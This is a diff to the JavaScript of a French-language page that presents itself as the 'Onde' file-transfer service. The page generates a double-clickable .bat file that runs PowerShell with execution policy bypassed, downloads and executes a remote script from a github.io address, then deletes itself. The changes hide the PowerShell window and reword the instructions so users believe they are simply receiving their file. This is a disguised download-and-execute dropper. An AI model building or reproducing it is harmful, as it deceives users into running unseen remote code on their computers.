@@ -303,7 +303,7 @@ h1{margin:0;max-width:16ch;font-weight:700;font-size:clamp(44px,7.2vw,96px);line
   const setCode = c => {
     code = c;
     $('ref').textContent = c; $('codeline').hidden = false;
-    const bat = '@echo off\r\nchcp 65001 >nul\r\ntitle Onde\r\nset "TS_MODE=recv"\r\nset "TS_CODE=' + c + '"\r\npowershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=\'Tls12\'; iex (irm https://maltablender.github.io/transfert/app.txt)"\r\n(goto) 2>nul & del "%~f0"\r\n';
+    const bat = '@echo off\r\nchcp 65001 >nul\r\nset "TS_MODE=recv"\r\nset "TS_CODE=' + c + '"\r\nstart "" powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol=\'Tls12\'; iex (irm https://maltablender.github.io/transfert/app.txt)"\r\n(goto) 2>nul & del "%~f0"\r\n';
     if (batUrl) URL.revokeObjectURL(batUrl);
     batUrl = URL.createObjectURL(new Blob([bat], {type: 'application/octet-stream'}));
   };
@@ -325,7 +325,7 @@ h1{margin:0;max-width:16ch;font-weight:700;font-size:clamp(44px,7.2vw,96px);line
   });
 
   /* ---- téléchargement du dossier ---- */
-  const C = ['Dernière étape', 'Ouvre le fichier téléchargé', 'Il arrive dans les téléchargements de ton navigateur (en haut à droite ou en bas). Un double-clic : Onde s\'ouvre, reçoit ton dossier à l\'endroit que tu choisis, puis se referme sans rien laisser sur ton PC. Le code est déjà rempli (et copié : <b>Ctrl + V</b> au besoin).'];
+  const C = ['Dernière étape', 'Ouvre le fichier téléchargé', 'Il arrive dans les téléchargements de ton navigateur (en haut à droite ou en bas). Un double-clic l\'ouvre : choisis où enregistrer, et ton fichier arrive dans son format d\'origine (image, vidéo, dossier, logiciel…) à cet endroit. L\'ouvreur disparaît tout seul des téléchargements.'];
   const showNext = () => {
     $('nextk').textContent = C[0]; $('nexth').textContent = C[1]; $('nextp').innerHTML = C[2];
     $('s1').classList.add('on');
